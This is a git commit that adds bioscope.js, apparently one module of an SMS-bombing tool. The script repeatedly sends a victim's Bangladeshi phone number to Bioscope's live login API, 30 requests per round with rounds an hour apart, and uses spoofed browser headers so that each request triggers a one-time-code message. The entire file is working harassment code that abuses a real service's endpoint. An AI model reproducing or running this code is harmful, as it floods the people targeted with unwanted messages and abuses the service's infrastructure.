5119fa18e4563aee7955def97d3705cf74285b74
HASAN MAHMUD <146573168+KingsOfToxiciter@users.noreply.github.com>
2025-07-05 01:33:58 +0600

    Create bioscope.js

---
+++ sites/bioscope.js
@@ -0,0 +1,56 @@
+const axios = require("axios");
+
+async function bioscope(number, limit) {
+  for (let round = 0; round < limit; round++) {
+    console.log(`▶ Round ${round + 1}/${limit} started`);
+
+    for (let i = 0; i < 30; i++) {
+      try {
+        const response = await axios.post(
+  'https://api-dynamic.bioscopelive.com/v2/auth/login',
+  {
+    'phone': `+88${number}`
+  },
+  {
+    params: {
+      'country': 'BD',
+      'platform': 'web',
+      'language': 'en'
+    },
+    headers: {
+      'authority': 'api-dynamic.bioscopelive.com',
+      'accept': 'application/json',
+      'accept-language': 'en-US,en;q=0.9',
+      'authorization': '',
+      'content-type': 'application/json',
+      'origin': 'https://www.bioscopelive.com',
+      'referer': 'https://www.bioscopelive.com/',
+      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+      'sec-ch-ua-mobile': '?1',
+      'sec-ch-ua-platform': '"Android"',
+      'sec-fetch-dest': 'empty',
+      'sec-fetch-mode': 'cors',
+      'sec-fetch-site': 'same-site',
+      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+    }
+  }
+);
+        
+        console.log(`[${i + 1}/10] bioscope Sent to ${number} | Response:`, response.data);
+      } catch (error) {
+        console.error(`[${i + 1}/10] bioscope Failed:`, error.message);
+      }
+
+      await new Promise(resolve => setTimeout(resolve, 3000));
+    }
+
+    if (round < limit - 1) {
+      console.log(`⏳ Waiting 1 hours before next round...`);
+      await new Promise(resolve => setTimeout(resolve, 3600000));
+    }
+  }
+
+  console.log("✅ All rounds completed.");
+}
+
+module.exports = { bioscope };
